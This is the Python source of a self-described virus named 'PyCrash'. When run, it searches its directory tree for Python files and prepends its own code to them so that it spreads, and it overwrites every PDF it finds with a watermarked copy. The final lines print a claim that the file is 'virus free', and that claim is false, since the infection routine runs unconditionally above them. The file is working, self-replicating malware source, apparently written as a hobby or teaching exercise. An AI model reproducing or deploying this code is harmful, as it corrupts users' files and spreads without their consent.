"""
PyCrash A simple virus written using Python that damage PDF files by watermarking
and can spread itself.
"""

import os
from PyPDF2 import PdfFileReader, PdfFileWriter

NAME = "PyCrash"


def search_py(path):
    """Searchs the given path recursively to find .py files"""
    files_to_infect = []  # the list of .py files to be infected
    filelist = os.listdir(path)  # the list of files in the current path
    for fname in filelist:
        # os.path.join(path, fname)
        full_path = path+"/"+fname
        if os.path.isdir(full_path):
            files_to_infect.extend(search_py(full_path))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(full_path):
                if "PyCrash" in line:
                    infected = True
                    break
            if not infected:
                files_to_infect.append(full_path)
    return files_to_infect


def infect_py_files(files_to_infect):
    """Infect .py files by modifying them to include the viurus code with them"""
    virus = open(os.path.abspath(__file__))  # open the current file to read
    viruscode = ""  # the code we want to add to infected python files
    for i, line in enumerate(virus):
        if i >= 0 and i < 100:
            viruscode += line
    virus.close()
    for fname in files_to_infect:
        with open(fname) as f:
            temp = f.read()

        with open(fname, "w") as f:
            f.write(viruscode+"\n"+temp)


def search_pdf(path):
    """Searchs the given path recursively to find PDF files"""
    pdfs_to_infect = []  # the list of PDf files to be infected
    filelist = os.listdir(path)  # the list of files in the current path
    for fname in filelist:
        full_path = path+"/"+fname
        if os.path.isdir(full_path):
            pdfs_to_infect.extend(search_pdf(full_path))
        elif fname[-4:] == ".pdf":
            pdfs_to_infect.append(full_path)
    return pdfs_to_infect


def add_watermark(filename):
    """Add a watermark to the given PDF file"""
    watermark = PdfFileReader(open(
        "watermark.pdf", 'rb'))  # a file containing the watermark text to be applied
    # to read the content of the watermark
    watermark_content = watermark.getPage(0)

    # to read the content of the given file
    pdf_reader = PdfFileReader(open(filename, 'rb'))
    pdf_writer = PdfFileWriter()  # to write the modified pdf file

    # now we add a water mark for every page on the file
    for i in range(pdf_reader.numPages):
        page = pdf_reader.getPage(i)
        page.mergePage(watermark_content)  # adding a watermark to the page

        pdf_writer.addPage(page)  # prepare watermarked pages to be written

    # after finishing watermarking each page, we overwrite the file
    with open(filename, "wb") as file:
        pdf_writer.write(file)


def virus_run():
    """Runs the virus program"""
    current_path = os.path.abspath(os.path.dirname(__file__))

    python_files = search_py(current_path)
    if len(python_files) > 0:
        infect_py_files(python_files)

    pdf_files = search_pdf(current_path)
    if len(pdf_files) > 0:
        for pdf in pdf_files:
            if "watermark" not in pdf:
                add_watermark(pdf)


virus_run()


print('this file is virus free now')
print('But if the virus code runs by some means, it will be infected')
